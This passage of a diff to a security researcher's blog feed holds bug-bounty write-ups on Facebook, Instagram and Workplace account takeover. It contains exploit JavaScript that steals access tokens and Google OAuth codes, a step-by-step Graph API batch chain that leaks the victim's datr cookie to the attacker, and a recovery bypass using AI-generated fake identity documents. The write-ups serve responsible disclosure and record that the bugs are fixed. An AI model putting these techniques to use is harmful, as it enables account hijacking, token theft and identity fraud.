+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">({</span>
+          <span class="na">jazoest</span><span class="p">:</span> <span class="dl">"</span><span class="s2">25620</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">fb_dtsg</span><span class="p">:</span> <span class="nx">dtsg</span><span class="p">,</span>
+          <span class="na">force_confirmation</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">display</span><span class="p">:</span> <span class="dl">"</span><span class="s2">async</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">__a</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">client_id</span><span class="p">:</span> <span class="dl">"</span><span class="s2">124024574287414</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">redirect_uri</span><span class="p">:</span>
+            <span class="dl">"</span><span class="s2">https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#origin=https://www.instagram.com&amp;relation=opener</span><span class="dl">"</span><span class="p">,</span>
+          <span class="na">response_type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">token</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">}),</span>
+      <span class="p">})</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span>
+          <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">relation=opener&amp;access_token=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="p">)</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">token</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="nb">window</span><span class="p">.</span><span class="nf">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">access_token:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
+        <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">getDtsg</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/dialog/oauth</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
+      <span class="p">})</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">(</span>
+          <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span>
+            <span class="nx">e</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">["MRequestConfig",[],{"dtsg":{"token":"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="p">);</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">wait</span> <span class="o">=</span> <span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">resolve</span><span class="p">(</span><span class="kc">true</span><span class="p">),</span> <span class="nx">time</span><span class="p">);</span>
+      <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="kd">const</span> <span class="nx">getGoogleLoginCode</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Trying to get Google code</span><span class="dl">"</span><span class="p">);</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">facebook.com</span><span class="dl">"</span><span class="p">;</span>
+
+      <span class="kd">const</span> <span class="nx">wnd</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span>
+        <span class="dl">"</span><span class="s2">https://accounts.google.com/o/oauth2/auth</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">?client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">&amp;response_type=code</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">&amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2Foauth2%2Fredirect%2F</span><span class="dl">"</span> <span class="o">+</span>
+          <span class="dl">"</span><span class="s2">&amp;scope=openid+email</span><span class="dl">"</span>
+      <span class="p">);</span>
+
+      <span class="nf">wait</span><span class="p">(</span><span class="mi">4000</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">google_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span>
+            <span class="nx">wnd</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span>
+          <span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">);</span>
+          <span class="nb">window</span><span class="p">.</span><span class="nf">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">google code:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">google_code</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+      <span class="p">});</span>
+    <span class="p">};</span>
+
+    <span class="nf">getDtsg</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">attacker_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nf">getDeviceAccounts</span><span class="p">(</span><span class="nx">attacker_dtsg</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="nx">data_post</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">data_post</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nf">loginAsVictim</span><span class="p">(</span><span class="nx">data_post</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nf">getDtsg</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">victim_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+              <span class="nf">getFirstPartyAccessToken</span><span class="p">(</span><span class="nx">victim_dtsg</span><span class="p">);</span>
+            <span class="p">});</span>
+          <span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+          <span class="nf">getGoogleLoginCode</span><span class="p">();</span>
+        <span class="p">}</span>
+      <span class="p">});</span>
+    <span class="p">});</span>
+  <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+`;
+
+const blob = new Blob([code], {
+type: "text/html",
+});
+window.location.href = URL.createObjectURL(blob);
+</code></pre></div></div>
+
+<p>This second scenario demonstrates that once JavaScript execution is achieved on <code class="language-plaintext highlighter-rouge">facebook.com</code>, the impact is <strong>not limited to linked platforms</strong>.</p>
+
+<p>Under realistic conditions, the attacker can:</p>
+
+<ul>
+  <li>Bypass passwords and 2FA</li>
+  <li>Hijack saved login sessions</li>
+  <li>Fully takeover the victim’s Facebook account</li>
+  <li>Maintain persistence without page reloads</li>
+</ul>
+
+<p>Combined with the original XSS vector, this results in a <strong>complete cross-platform account compromise</strong>.</p>
+
+<h2 id="impact">Impact</h2>
+<hr />
+<p><br />
+The immediate impact is <strong>account takeover</strong> of Facebook, Instagram and Workplace accounts by only visiting attacker website.  However, the broader implication is more severe. This vulnerability effectively allows <strong>ThirdPartyPaymentProvider.com to execute JavaScript in the context of facebook.com</strong> remotly.</p>
+
+<p>A malicious actor could target ThirdPartyPaymentProvider infrastructure to inject a stored payload that automatically compromises <strong>any Facebook user attempting to add a payment method</strong>.</p>
+
+<p>Such an attack would:</p>
+
+<ul>
+  <li>Require no user interaction</li>
+  <li>Affect Facebook, Instagram, and Workplace users</li>
+  <li>Trigger during routine billing actions the user takes</li>
+</ul>
+
+<p>Due to the potential scale and impact, further exploitation was intentionally avoided.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 18, 2024 — Bug reported</p>
+
+<p>Oct 18, 2024 — Bug Acknowledged by Facebook</p>
+
+<p>Nov 19, 2024 — Bug Fixed by Facebook</p>
+
+<p>Nov 20, 2024 — <strong>$62,500</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Facebook’s payments and billing flows rely heavily on third-party financial service providers. To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and facebook.com.]]></summary></entry><entry><title type="html">Datr cookie theft and AI leading to Facebook account takeover via trusted device recovery</title><link href="http://localhost:4000/uncategorized/2025/01/15/steal-dtsg-cookie.html" rel="alternate" type="text/html" title="Datr cookie theft and AI leading to Facebook account takeover via trusted device recovery" /><published>2025-01-15T00:00:00+02:00</published><updated>2025-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2025/01/15/steal-dtsg-cookie</id><content type="html" xml:base="http://localhost:4000/uncategorized/2025/01/15/steal-dtsg-cookie.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<hr />
+<p><br />
+Facebook relies on long-lived device identifiers to reduce friction for returning users and to distinguish legitimate activity from suspicious logins. Over time, devices that repeatedly authenticate to the same account are treated as trusted, allowing Facebook to relax certain security requirements during sensitive flows such as account recovery.</p>
+
+<p>One of the core identifiers used for this purpose is the <code class="language-plaintext highlighter-rouge">datr</code> cookie. This cookie is designed to uniquely identify a browser and persists for long periods of time. Once a browser accumulates sufficient trust, Facebook treats possession of this cookie as strong evidence that the device belongs to the legitimate account owner.</p>
+
+<p>This report describes a vulnerability that allows an attacker to steal the <code class="language-plaintext highlighter-rouge">datr</code> cookie from a victim’s browsing session and reuse it to impersonate a trusted device. By abusing Facebook’s trusted device account recovery flow, the attacker can bypass passwords and two-factor authentication and fully take over the victim’s account.</p>
+
+<h2 id="description">Description</h2>
+<hr />
+<h3 id="trusted-devices-and-account-recovery">Trusted Devices and Account Recovery</h3>
+<p>When a user initiates account recovery at: <code class="language-plaintext highlighter-rouge">https://www.facebook.com/recover/account/</code></p>
+
+<p>Facebook typically requires verification through an email address or phone number associated with the account. However, when the request originates from a trusted device, Facebook offers an alternative path for users who claim they no longer have access to those contact methods.</p>
+
+<p>In this case, the platform allows recovery through identity verification by uploading a document. This flow is largely automated and is intended to help legitimate users regain access when traditional recovery options are unavailable.</p>
+
+<p>The security of this flow relies entirely on the assumption that a trusted device cannot be easily impersonated.</p>
+
+<h3 id="leaking-the-datr-cookie-via-oauth-and-graph-api">Leaking the DATR Cookie via OAuth and Graph API</h3>
+
+<p>The vulnerability originates from the interaction between Facebook’s OAuth implementation and the Graph API.</p>
+
+<p>By creating a legitimate Facebook application and enabling Facebook Login, an attacker can generate OAuth authorization codes and access tokens using documented flows. Under specific conditions, exchanging an OAuth authorization code while a <code class="language-plaintext highlighter-rouge">datr</code> cookie is present causes Facebook to include a parameter named <code class="language-plaintext highlighter-rouge">machine_id</code> in the response.</p>
+
+<p>This <code class="language-plaintext highlighter-rouge">machine_id</code> value directly corresponds to the browser’s datr cookie.</p>
+
+<p>While this response is not directly readable cross-origin, Facebook’s <code class="language-plaintext highlighter-rouge">batch API</code> allows chaining multiple Graph API requests and referencing fields from earlier responses. By abusing this behavior, the attacker can propagate the <code class="language-plaintext highlighter-rouge">machine_id</code> value into attacker-controlled output, such as a Facebook Page post.</p>
+
+<p>As a result, a sensitive device identifier that should remain confidential is exposed to the attacker.</p>
+
+<h3 id="attack-flow-summary">Attack Flow Summary</h3>
+
+<h4 id="preparation">Preparation</h4>
+<hr />
+<p><br />
+1) Create a Facebook Page</p>
+
+<p>2) Create a Facebook App noted <code class="language-plaintext highlighter-rouge">ATTACKER_APP_ID</code></p>
+
+<p>3) Allow Facebook Login for the app</p>
+
+<p>4) Visit link below and you should retrieve an access_token noted <code class="language-plaintext highlighter-rouge">ACCESS_TOKEN</code> :</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/dialog/oauth?
+<span class="err">&amp;</span>app_id=ATTACKED_APP_ID
+<span class="err">&amp;</span>redirect_uri=EXACT_REDIRECT_URI
+<span class="err">&amp;</span>response_type=token
+</code></pre></div></div>
+
+<p>5) Visit link below and it should return an access_token noted <code class="language-plaintext highlighter-rouge">LONG_LIVED_ACCESS_TOKEN</code> :</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/oauth/access_token?
+<span class="err">&amp;</span>client_id=ATTACKER_APP_ID
+<span class="err">&amp;</span>client_secret=ATTACKER_APP_SECRET
+<span class="err">&amp;</span>redirect_uri=EXACT_REDIRECT_URI
+<span class="err">&amp;</span>method=post
+<span class="err">&amp;</span>fb_exchange_token=ACCESS_TOKEN
+</code></pre></div></div>
+
+<p>6) Visit link below and it should return an OAuth code noted <code class="language-plaintext highlighter-rouge">ATTACKER_CODE</code> :</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/oauth/client_code?
+<span class="err">&amp;</span>client_id=ATTACKER_APP_ID
+<span class="err">&amp;</span>client_secret=ATTACKER_APP_SECRET
+<span class="err">&amp;</span>redirect_uri=EXACT_REDIRECT_URI
+<span class="err">&amp;</span>method=post
+<span class="err">&amp;</span>access_token=LONG_LIVED_ACCESS_TOKEN
+</code></pre></div></div>
+
+<h4 id="attack">Attack</h4>
+<hr />
+<p><br />
+1) We’ll use the <strong>ATTACKER_CODE</strong> mentioned above in this request:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/oauth/access_token?
+<span class="err">&amp;</span>client_id=ATTACKER_APP_ID
+<span class="err">&amp;</span>redirect_uri=REDIRECT_URI
+<span class="err">&amp;</span>method=get
+<span class="err">&amp;</span>code=ATTACKER_CODE
+</code></pre></div></div>
+
+<p>If you navigate to this URL, while logged-in/logged-out on Facebook ( and assuming <code class="language-plaintext highlighter-rouge">datr</code> cookie is set ), this would return the <code class="language-plaintext highlighter-rouge">datr</code> cookie in the response inside a parameter named <code class="language-plaintext highlighter-rouge">machine_id</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">PS: The ATTACKER_CODE could be used once, so every time redo only step 6 from preparation above</code></p>
+
+<p>2) In order to leak the response of the previous request, we’ll use <code class="language-plaintext highlighter-rouge">BATCH</code> requests, we’ll get the <code class="language-plaintext highlighter-rouge">machine_id</code> from the response and pass it to , For example, to another edge that make a page post:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/?
+<span class="err">&amp;</span>batch=
+[
+  {
+    "method": "post",
+    "omit_response_on_success": 0,
+    "relative_url": "/oauth/access_token?client_id=ATTACKER_APP_ID%26redirect_uri=EXACT_REDIRECT_URI",
+    "body": "code=ATTACKER_CODE",
+    "name": "test"
+  },
+  {
+    "method": "post",
+    "relative_url": "ATTACKER_PAGE_ID/posts",
+    "body": "message={result=test:$.machine_id}"
+  }
+]
+<span class="err">&amp;</span>access_token=ATTACKER_PAGE_TOKEN
+<span class="err">&amp;</span>method=post
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">PS: I used the creation of a page post to log victim's datr cookie, but many other ways can be used, like querying an external website, by using a picture upload via url. This was the simplest way for a proof of concept :)</code></p>
+
+<p>To steal the <code class="language-plaintext highlighter-rouge">datr</code> cookie, the attacker embeds the crafted Graph API batch url above inside an invisible iframe hosted on any website.</p>
+
+<p>When a victim visits the page, the browser automatically fetchs the url with the <code class="language-plaintext highlighter-rouge">datr</code> cookie included in the request ( <code class="language-plaintext highlighter-rouge">SameSite=None</code> ). The request returns the <code class="language-plaintext highlighter-rouge">datr</code> cookie value inside <code class="language-plaintext highlighter-rouge">machine_id</code> and the batch request exfiltrates it and send it to the attacker. No user interaction is required beyond visiting the page.</p>
+
+<h3 id="reusing-the-cookie-to-impersonate-a-trusted-device">Reusing the Cookie to Impersonate a Trusted Device</h3>
+
+<p>Once the attacker obtains the stolen <code class="language-plaintext highlighter-rouge">datr</code> value, they inject it into a fresh browser session and navigate to facebook.com. From Facebook’s perspective, the attacker is now using a trusted device associated with the victim.</p>
+
+<p>At this point, the attacker initiates the account recovery flow and supplies the victim’s user ID. When prompted to confirm account ownership, the attacker selects the option indicating that they no longer have access to the email or phone number.</p>
+
+<p>Because the request originates from a trusted device, Facebook proceeds with identity verification instead of blocking the recovery attempt.</p>
+
+<h3 id="abusing-identity-verification">Abusing Identity Verification</h3>
+
+<p>The identity verification step requires uploading a document that matches the victim’s personal details. The information required for verification typically includes the victim’s full name, date of birth, and country of origin.</p>
+
+<p>In practice, this information is often obtainable from public Facebook profile data, historical posts, the “About” section, or external data sources that have aggregated leaked personal information.</p>
+
+<p>Using AI-powered document generation services, an attacker can create a synthetic but plausible identity document, such as a visa. Testing confirmed that such documents are accepted by the automated verification system.</p>
+
+<p>Once the document is approved, Facebook allows the attacker to add a new email address to the account. This occurs within minutes and does not require extended manual review.</p>
+
+<h2 id="impact">Impact</h2>
+<hr />
+<p><br />
+This vulnerability enables full Facebook account takeover by combining cookie theft with trusted device recovery. It bypasses passwords, two-factor authentication, and relies on identity verification mechanisms that assume possession of a trusted device implies legitimacy.</p>
+
+<p>Once the <code class="language-plaintext highlighter-rouge">datr</code> cookie is compromised, the attacker effectively controls the account recovery process.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Dec 18, 2024 — Bug reported</p>
+
+<p>Dec 19, 2024 — Bug Acknowledged by Facebook</p>
+
+<p>Jan 15, 2025 — <strong>$24,000</strong> bounty awarded by Meta</p>
+
+<p>Jan 27, 2025 — Bug Fixed by Facebook</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Facebook relies on long-lived device identifiers to reduce friction for returning users and to distinguish legitimate activity from suspicious logins. Over time, devices that repeatedly authenticate to the same account are treated as trusted, allowing Facebook to relax certain security requirements during sensitive flows such as account recovery.]]></summary></entry><entry><title type="html">Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover</title><link href="http://localhost:4000/uncategorized/2025/01/13/capig-xss.html" rel="alternate" type="text/html" title="Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover" /><published>2025-01-13T14:04:43+02:00</published><updated>2025-01-13T14:04:43+02:00</updated><id>http://localhost:4000/uncategorized/2025/01/13/capig-xss</id><content type="html" xml:base="http://localhost:4000/uncategorized/2025/01/13/capig-xss.html"><![CDATA[<h2 id="introduction">Introduction</h2>
 
 <p>The Meta Conversions API Gateway is a server-side solution developed by Meta (formerly Facebook) that allows businesses to send web events, such as customer interactions and purchase data, directly from their servers to Meta’s platforms, bypassing traditional browser-based tracking methods like the Facebook Pixel.</p>
 
@@ -812,324 +1559,4 @@ window.parent.postMessage(fullmsg,"*")</code></pre>
 <p><!-- wp:paragraph --></p>
 <p><strong>Details</strong> </p>
 <p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Description These bugs could allow malicious actors who owns Android Applications installed in the victim device alongside Facebook owned Android Applications ( Workplace, Facebook, Messenger .. ) to steal a first-party access token and use it to takeover the user Facebook/Workplace account. Details]]></summary></entry><entry><title type="html">More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers</title><link href="http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html" rel="alternate" type="text/html" title="More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers" /><published>2021-09-03T05:22:42+03:00</published><updated>2021-09-03T05:22:42+03:00</updated><id>http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers</id><content type="html" xml:base="http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html"><![CDATA[<p><!-- wp:paragraph --></p>
-<p><strong>Summery</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i'll be discussing multiple vulnerabilities i found in this implementation.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Vulnerabilities potential</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what's coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn't see any indicators of previous abuse or exploitation of these bugs.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>For Researchers</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn't left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Description</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they'll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) :</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code {"lineNumbers":true} --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript line-numbers">__d("XdArbiter", ...
-            handleMessage: function(a, b, e) {
-                d("Log").debug("XdArbiter at " + (window.name != null &amp;&amp; window.name !== "" ? window.name : window == top ? "top" : "[no name]") + " handleMessage " + JSON.stringify(a));
-                if (typeof a === "string" &amp;&amp; /^FB_RPC:/.test(a)) {
-                    k.enqueue([a.substring(7), {
-                        origin: b,
-                        source: e || i[h]
-                    }]);
-           ...
-            send: function(a, b, e) {
-                var f = e in i ? e : h;
-                a = typeof a === "string" ? a : c("QueryString").encode(a);
-                b = b;
-                try {
-                    d("SecurePostMessage").sendMessageToSpecificOrigin(b, a, e)
-                } catch (a) {
-                    d("Log").error("XdArbiter: Proxy for %s not available, page might have been navigated: %s", f, a.message), delete i[f]
-                }
-                return !0
-            }
-...
-
-    window.addEventListener("message", function(a) {
-        if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
-            xdArbiterAck: !0
-        });
-        else if (a.data.xdArbiterRegister) {
-            var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin);
-            d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
-                xdArbiterRegisterAck: b
-            })
-        } else a.data.xdArbiterHandleMessage &amp;&amp; l.handleMessage(a.data.message, a.data.origin, a.source)
-}), 98);
-
-__d("JSONRPC", ...
-        c.read = function(a, c) {
-            ...
-            e = this.local[a.method];
-            try {
-                e = e.apply(c || null, a.params);
-                typeof e !== "undefined" &amp;&amp; g("result", e)
-            ...
-    e.exports = a
-}), null);
-
-__d("PlatformAppController", ...
-function f(a, b, e) { ...
-         c("PlatformDialogClient").async(f, a, function(d) { ... b(d) });
-}...
-t.local.showDialog = f;
-
-...
-
-t = new(c("JSONRPC"))(function(a, b) {
-            var d = b.origin || k;
-            b = b.source;
-            if (b == null) {
-                var e = c("ge")(j);
-                b = e.contentWindow
-            }
-            c("XdArbiter").send("FB_RPC:" + a, b, d)
-        }
-...
-
-<meta http-equiv="content-type" content="text/html; charset=utf-8">}), null);
-
-__d("PlatformDialogClient", ...
-function async(a, b, e) {
-        var f = c("guid")(),
-            g = b.state;
-        b.state = f;
-        b.redirect_uri = new(c("URI"))("/dialog/return/arbiter").setSubdomain("www").setFragment(c("QueryString").encode({
-            origin: b.redirect_uri
-        })).getQualifiedURI().toString();
-        b.display = "async";
-        j[f] = {
-            callback: e || function() {},
-            state: g
-        };
-        e = "POST";
-        d("AsyncDialog").send(new(c("AsyncRequest"))(this.getURI(a, b)).setMethod(e).setReadOnly(!0).setAbortHandler(k(f)).setErrorHandler(l(f)))
-    }
-...
-function <meta http-equiv="content-type" content="text/html; charset=utf-8">getURI(a, b) {
-        if (b.version) {
-            var d = new(c("URI"))("/" + b.version + "/dialog/" + a);
-            delete b.version;
-            return d.addQueryData(b)
-        }
-        return c("PlatformVersioning").versionAwareURI(new(c("URI"))("/dialog/" + a).addQueryData(b))
-    }
-
-}), 98);
-
-</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p>To simplify the code for you to understand the flow in case someone decides to dig more into it and looks for more bugs : </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Iframe sends message to parent <strong>=></strong> Message event dispatched in <meta http-equiv="content-type" content="text/html; charset=utf-8">XdArbiter <strong>=></strong>  Message handler function passes data to handleMessage function <strong>=> </strong>"enqueue" function passes to <meta http-equiv="content-type" content="text/html; charset=utf-8">JSONRPC => <meta http-equiv="content-type" content="text/html; charset=utf-8">JSONRPC.read calls this.local.<meta http-equiv="content-type" content="text/html; charset=utf-8">showDialog function in <meta http-equiv="content-type" content="text/html; charset=utf-8">PlatformAppController <strong>=></strong> function checks message and if all valid, call <meta http-equiv="content-type" content="text/html; charset=utf-8">PlatformDialogClient <strong>=></strong> <meta http-equiv="content-type" content="text/html; charset=utf-8">PlatformDialogClient.async sends a POST request to <strong>apps.facebook.com/dialog/oauth</strong> , returned access_token would be passed to <meta http-equiv="content-type" content="text/html; charset=utf-8">XdArbiter.send function ( few steps were skipped ) <strong>=></strong> <meta http-equiv="content-type" content="text/html; charset=utf-8"> <meta http-equiv="content-type" content="text/html; charset=utf-8">XdArbiter.send would send a cross window message to the iframe window <strong>=></strong> Event dispatched in iframe window containing Facebook user access_token</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Below an example of a simple code to construct the message to be sent to apps.facebook.com from the iframe, a similar one would be send from any game page using the Facebook Javascript SDK but with more unnecessary parts:</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript"> msg = JSON.stringify({"jsonrpc":"2.0",
-                                    "method":"showDialog",
-                                    "id":1,
-                                    "params":[{"method":"permissions.oauth","display":"async","redirect_uri":"https://ysamm.com/callback","app_id":"APP_ID","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">APP_ID","response_type":"token"}]})
